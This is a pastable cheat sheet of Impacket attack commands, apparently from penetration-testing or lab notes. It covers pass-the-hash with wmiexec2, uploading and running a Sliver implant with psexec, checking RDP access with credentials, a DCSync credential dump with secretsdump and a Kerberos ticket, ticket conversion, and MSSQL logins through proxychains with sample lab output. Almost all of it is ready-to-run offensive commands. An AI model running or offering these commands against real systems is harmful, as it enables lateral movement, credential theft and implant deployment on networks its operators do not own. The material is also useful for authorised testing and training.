# Impacket Pastable Commands

### wmiexec2 — Pass the Hash with NT Hash Only

When you only have the NT hash, prefix with `:` (no LM hash needed):

```bash
python3 wmiexec2.py ./Administrator@TARGET -hashes ':NT_HASH' -shell-type powershell
python3 wmiexec2.py DOMAIN/Administrator@TARGET -hashes ':fd02e525dd676fd8ca04e200d265f20c' -shell-type powershell
```

### impacket-psexec — Push and Execute Binary

Use `-c` to upload a local binary and execute it on the target:

```bash
impacket-psexec DOMAIN/user:"password"@TARGET -c /tmp/sliver.exe
impacket-psexec ./user:"password"@TARGET -c /tmp/sliver.exe
```

### impacket-rdp_check — Verify RDP Access

Check if credentials grant RDP access before launching a full RDP session:

```bash
impacket-rdp_check DOMAIN/user:'password'@TARGET

# Access Granted = can RDP
# Access Denied = cannot RDP
```

### impacket-secretsdump — DCSync with Kerberos

When you have a Kerberos TGT (e.g. from pass-the-certificate):

```bash
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip DC_IP DOMAIN/dc01\$@dc01.domain.local
```

### impacket-ticketConverter

Convert between ccache and kirbi ticket formats:

```bash
impacket-ticketConverter /tmp/julio.ccache julio.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
```

---

### impacket-mssqlclient

```
#set env vars
domain=RLAB
user=epugh_adm
pass=Password!
ip=10.10.122.15
proxychains -q impacket-mssqlclient $domain/$user:$pass@$ip -windows-auth
```

### Windows Auth issues&#x20;

* If you recieve this error below

```
python3 mssqlclient.py $user:$pass@$ip -windows-auth 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(DANTE-SQL01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
```

* Drop the `-windows-auth` and run the same command :)&#x20;

```
python3 mssqlclient.py $user:$pass@$ip              
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (administrator dbo@master)> 
```
